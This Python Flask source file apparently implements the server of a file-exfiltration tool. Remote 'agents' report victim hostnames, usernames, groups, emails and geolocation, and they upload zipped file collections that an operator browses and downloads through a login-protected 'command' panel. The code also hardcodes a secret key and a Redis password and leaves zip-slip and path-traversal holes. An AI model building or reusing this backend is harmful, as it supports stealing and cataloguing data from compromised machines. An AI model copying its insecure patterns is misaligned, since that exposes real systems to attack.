from flask import (Flask, request, jsonify, Response, render_template,
                   send_file, send_from_directory, redirect, flash, url_for, session)
import os, zipfile, random, requests, shutil
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime, timedelta
from os.path import getsize
from flask_login import LoginManager, login_required, current_user, UserMixin, login_user, logout_user
from werkzeug.security import generate_password_hash, check_password_hash
from captcha.image import ImageCaptcha
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address


# ---------------------- Flask configuration ---------------------- #
app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///site.db'
db = SQLAlchemy(app)
login_manager = LoginManager()
login_manager.init_app(app)
login_manager.login_view = 'login'
app.config["SECRET_KEY"] = "fksdly48thergl9#8%3@45t%u9834tu95$hgui$rfg49$t67"
app.config['REMEMBER_COOKIE_DURATION'] = timedelta(hours=24)
app.config['REDIS_URL'] = 'redis://:jackass%23XX1717@localhost:6379/0'

limiter = Limiter(
    key_func=get_remote_address,
    app=app,
    storage_uri=app.config['REDIS_URL']
)

# ---------------------- Database tables ---------------------- #


class Agents(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    uid = db.Column(db.String(80), unique=True)
    hostname = db.Column(db.String(80))
    username = db.Column(db.String(80))
    local_ip = db.Column(db.String(80))
    local_groups = db.Column(db.String(360))
    email = db.Column(db.String(120))
    os_name = db.Column(db.String(80))
    os_version = db.Column(db.String(80))
    os_arch = db.Column(db.String(120))
    file_path = db.Column(db.String(500))
    agent_creation = db.Column(db.DateTime)
    file_addition = db.Column(db.DateTime)
    # geolocation data
    public_ip = db.Column(db.String(120))
    city = db.Column(db.String(120))
    region = db.Column(db.String(120))
    country = db.Column(db.String(120))
    postal = db.Column(db.String(120))
    latitude = db.Column(db.String(120))
    longitude = db.Column(db.String(120))


class Administrator(db.Model, UserMixin):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password = db.Column(db.String(128), nullable=False)

    def set_password(self, password):
        self.password = generate_password_hash(password)

    def check_password(self, password):
        return check_password_hash(self.password, password)

    def is_active(self):
        return True


with app.app_context():
    #db.drop_all()
    db.create_all()


# ---------------------- Public Routes ---------------------- #

@app.route('/', methods=["GET"])
@limiter.limit('100 per 1 hour')
def index():
    return render_template('index.html')


def is_zip_valid(filepath):
    try:
        with zipfile.ZipFile(filepath, 'r') as zip_ref:
            bad_file = zip_ref.testzip()
            if bad_file:
                return False
            return True
    except zipfile.BadZipFile:
        return False


def geolocation_id(ip):
    location = {}
    try:
        url = f'https://ipapi.co/{ip}/json/'
        resp = requests.get(url=url, timeout=10).json()
        location = {
            "public_ip": ip,
            "city": resp.get("city"),
            "region": resp.get("region"),
            "country": resp.get("country_name"),
            "postal": resp.get("postal"),
            "latitude": resp.get("latitude"),
            "longitude": resp.get("longitude"),
        }
    except: pass
    return location


@app.route('/add_agent', methods=['POST'])
@limiter.limit("10 per 1 hour")
def add_agent():
    try:
        if 'HTTP_X_FORWARDED_FOR' in request.environ:
            user_ip = request.environ['HTTP_X_FORWARDED_FOR'].split(',')[0].strip()
        else:
            user_ip = request.remote_addr

        data = request.json
        agent = Agents.query.filter_by(uid=data.get('uid')).first()
        if agent:
            return jsonify({'message': 'agent already exist'}), 405
        geolocation = geolocation_id(user_ip)


        new_agent = Agents(
            uid=data.get('uid', None),
            hostname=data.get('hostname', None),
            username=data.get('username', None),
            local_ip=data.get('local_ip', None),
            local_groups=data.get('local_groups', None),
            email=data.get('email', None),
            os_name=data.get('os_name', None),
            os_version=data.get('os_version', None),
            os_arch=data.get('os_arch', None),
            agent_creation=datetime.now().astimezone(),
            public_ip=geolocation.get("public_ip", None),
            city=geolocation.get("city", None),
            region=geolocation.get("region", None),
            country=geolocation.get("country", None),
            postal=geolocation.get("postal", None),
            latitude=geolocation.get("latitude", None),
            longitude=geolocation.get("longitude", None),
        )

        db.session.add(new_agent)
        db.session.commit()
    except Exception as e:
        app.logger.error(f"Error occurred: {e}")

    return jsonify({'message': 'created'}), 201


@app.route('/upload', methods=['POST'])
def upload_file():
    file = request.files.get('file')
    uid = request.form.get('uid')

    agent = Agents.query.filter_by(uid=uid).first()

    if not uid or not agent:
        app.logger.error("Invalid or missing UID")
        return jsonify({"error": "Invalid or missing UID"}), 403

    if not file:
        app.logger.error("No file part in the request")
        return jsonify({"error": "No file part in the request"}), 400

    unique_filename = f"{uid}.zip"

    # Check for Content-Range header for resumable uploads
    range_header = request.headers.get('Content-Range', '').strip()
    beginning_bytes = 0
    if range_header.startswith('bytes '):
        beginning_bytes, _ = range_header[len('bytes '):].split('-')
        beginning_bytes = int(beginning_bytes.strip())

    filepath = os.path.join(os.getcwd(), "files", unique_filename)

    # Handle resumable upload (append to file)
    mode = 'ab' if beginning_bytes else 'wb'
    with open(filepath, mode) as f:
        if mode == 'ab':
            f.seek(beginning_bytes)
        f.write(file.read())

    # Check if the ZIP file is valid before extraction
    if is_zip_valid(filepath):
        # Extract the zip file
        unzip_dir = os.path.join(os.getcwd(), "files", uid)
        if not os.path.exists(unzip_dir):
            os.makedirs(unzip_dir)
        with zipfile.ZipFile(filepath, 'r') as zip_ref:
            zip_ref.extractall(unzip_dir)
        os.remove(filepath)

        # Update the agent's file addition date
        agent.file_addition = datetime.now().astimezone()
        agent.file_path = unzip_dir  # set the folder path in the agent's record
        db.session.commit()

        app.logger.info(f"File saved to {filepath} and extracted to {unzip_dir}")

    else:
        app.logger.error(f"The ZIP file {filepath} is not valid or still being uploaded")

    if mode == 'ab':
        return Response(status=206)  # Partial Content
    else:
        return jsonify({"message": "File uploaded successfully"}), 200


@app.route('/speedtest', methods=['POST'])
@limiter.limit("10 per 1 hour")
def speedtest():
    _ = request.data
    return jsonify({"message": "speed test done"}), 200


@app.route('/login', methods=['GET', 'POST'])
@limiter.limit("100 per 1 hour")
def login():
    if current_user.is_authenticated:
        return redirect(url_for('command'))

    # CAPTCHA Handling for POST request
    if request.method == "POST":
        captcha_response = request.form.get("captcha_response", "").strip().lower()
        stored_captcha = session.get("captcha_answer", "").lower()

        if not captcha_response or captcha_response != stored_captcha:
            flash('Invalid CAPTCHA answer.', 'danger')
            return redirect(url_for('login'))

        username = request.form.get("username")
        password = request.form.get("password")
        remember = True if request.form.get("remember_me") else False

        user = Administrator.query.filter_by(username=username).first()
        if user and check_password_hash(user.password, password):
            login_user(user, remember=remember)
            return redirect(url_for('command'))
        else:
            flash('Invalid username or password.', 'danger')
            return redirect(url_for('login'))

    # CAPTCHA Handling for GET request
    safe_chars = 'ab23456'
    captcha_answer = ''.join(random.choices(safe_chars, k=4))
    session['captcha_answer'] = captcha_answer

    image_captcha = ImageCaptcha()
    captcha_path = os.path.join("static", "captcha", f"captcha_{captcha_answer}.png")
    image_captcha.write(captcha_answer, captcha_path)

    # return the login page with the path to the captcha image
    return render_template("login.html",
                           captcha_image_url=url_for('static', filename=f'captcha/captcha_{captcha_answer}.png'))


@login_manager.user_loader
def load_user(user_id):
    return Administrator.query.get(int(user_id))


@app.errorhandler(429)
def ratelimit_error(e):
    return jsonify(error="ratelimit exceeded", message=str(e.description)), 429


# ---------------------- Protected Routes ---------------------- #

@app.route('/command')
@login_required
def command():
    agents = Agents.query.all()
    return render_template('command.html', active='command', agents=agents)


def get_total_size(path):
    total = 0
    if os.path.isfile(path):
        total += os.path.getsize(path)
    elif os.path.isdir(path):
        for item in os.listdir(path):
            total += get_total_size(os.path.join(path, item))
    return total


@app.route('/sorted_agents')
@login_required
def sorted_agents():
    sortby = request.args.get('sortby', 'local_ip')
    query = request.args.get('query', '')
    agents_query = Agents.query

    if query:
        if sortby == 'local_ip':
            search_value = query.rstrip('%')
            agents_query = agents_query.filter(Agents.local_ip.like(f"{search_value}%"))
        # For country, region and city:
        elif sortby in ['country', 'region', 'city']:
            search_value = query.lower()
            agents_query = agents_query.filter(getattr(Agents, sortby).ilike(f"%{search_value}%"))
    agents = agents_query.order_by(getattr(Agents, sortby)).all()

    return render_template('command.html', agents=agents)


@app.route('/view_files/<uid>', defaults={'subpath': None}, methods=['GET'])
@app.route('/view_files/<uid>/<path:subpath>', methods=['GET'])
@login_required
def view_files(uid, subpath=None):
    agent = Agents.query.filter_by(uid=uid).first()
    if not agent:
        return "Agent not found", 404

    if subpath:
        base_path = os.path.join(agent.file_path, subpath)
    else:
        base_path = agent.file_path

    if not os.path.exists(base_path):
        return "File or directory not found", 404

    if os.path.isfile(base_path):
        # If base_path is a file, send it for viewing
        return send_file(base_path, mimetype='text/plain')

    files = []
    directories = []

    for item in os.listdir(base_path):
        if os.path.isdir(os.path.join(base_path, item)):
            directories.append(item)
        else:
            files.append(item)

    directories.sort()
    files.sort()

    # Breadcrumbs
    breadcrumbs = []
    if subpath:
        parts = subpath.split('/')
        for i, part in enumerate(parts):
            breadcrumbs.append({
                'name': part,
                'path': '/'.join(parts[:i+1])
            })

    total_size = 0
    num_files = len(files)
    for file in files:
        total_size += getsize(os.path.join(base_path, file))

    # Size of the root directory and everything in it
    base_size = get_total_size(base_path)
    total_num_files = 0  # reset this variable
    for dirpath, dirnames, filenames in os.walk(base_path):
        total_num_files += len(filenames)

    total_files = sum([len(files) for _, _, files in os.walk(base_path)])

    # Collecting all starting characters from directories and files
    all_chars = set(dir[0].lower() for dir in directories)
    all_chars.update(file[0].lower() for file in files)
    all_chars = sorted(list(all_chars))

    return render_template("explorer.html", directories=directories, files=files, agent=agent, subpath=subpath,
                           breadcrumbs=breadcrumbs, total_size=total_size, num_files=num_files, total_files=total_files,
                           base_size=base_size, all_chars=all_chars, total_num_files=total_num_files)


@app.route('/download_file/<uid>/<path:subpath>')
@login_required
def download_file(uid, subpath):
    agent = Agents.query.filter_by(uid=uid).first()
    if not agent:
        return "Agent not found", 404

    file_path = os.path.join(agent.file_path, subpath)
    if not os.path.exists(file_path):
        return "File not found", 404

    return send_from_directory(agent.file_path, subpath, as_attachment=True)


@app.route('/delete_agent/<int:agent_id>', methods=['GET'])
@login_required
def delete_agent(agent_id):
    agent = Agents.query.get(agent_id)
    if agent:
        # Delete the agent's folder if it exists
        folder_path = agent.file_path
        if folder_path and os.path.exists(folder_path):
            shutil.rmtree(folder_path)
        # Delete the agent's entry from the database
        db.session.delete(agent)
        db.session.commit()
        flash('Agent and associated data deleted successfully.', 'success')
    else:
        flash('Error deleting agent.', 'danger')

    return jsonify({"status": "done"})


@app.route('/logout')
@login_required
def logout():
    logout_user()
    return redirect(url_for('login'))


if __name__ == '__main__':
    app.run(debug=True, host="0.0.0.0")

